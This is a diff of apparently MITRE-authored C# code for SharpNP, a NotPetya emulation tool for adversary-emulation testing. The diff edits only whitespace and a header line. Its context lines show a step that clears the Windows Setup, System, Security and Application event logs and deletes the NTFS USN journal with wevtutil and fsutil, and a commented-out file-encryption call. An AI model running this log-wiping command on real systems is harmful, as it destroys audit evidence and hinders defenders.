@@ -1,12 +1,12 @@
 ﻿/*=============================================================================================
 *
 *    Description:  This program emulates NotPetya.
-*   
+*
 *        Version:  1.0
 *        Created:  September 1st, 2021
 *
 *      Author(s):  Jesse Burgoon
-*   Organization:  MITRE Engenuity
+*   Organization:  The MITRE Corporation
 *
 *  References(s): https://attack.mitre.org/software/S0368/
 *
@@ -121,7 +121,7 @@ namespace SharpNP
             // ********************** Step 6 **********************
             // Delete local logs with the following command:
             // cmd.exe /c wevtutil cl Setup & wevtutil cl System &wevtutil cl Security &wevtutil cl Application &fsutil usn deletejournal /D C:
-            
+
             Console.WriteLine("[i] Wiping logs");
             string evasionBin = @"C:\Windows\System32\cmd.exe";
             string evasionArgs = @"/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:";
@@ -175,7 +175,7 @@ namespace SharpNP
             // SharpNP.NPCrypt.EncryptFiles();
 
             // ********************** Step 6 **********************
-            // Delete local logs 
+            // Delete local logs
 
             string evasionBin = @"C:\Windows\System32\cmd.exe";
             string evasionArgs = @"/c wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:";
